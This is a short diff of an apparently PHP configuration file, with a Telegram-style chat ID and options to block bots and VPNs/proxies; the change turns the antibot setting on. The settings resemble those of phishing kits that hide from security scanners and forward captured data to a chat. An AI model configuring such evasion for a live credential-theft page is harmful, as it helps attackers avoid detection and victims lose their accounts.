@@ -5,7 +5,7 @@ $chat_id ="-1003987841987";
 
 
 // use antibot? yes|no
-$antibot = "no";
+$antibot = "yes";
 
 // want to block all VPNs/PROXIES? yes|no
 $block_proxy = "no";
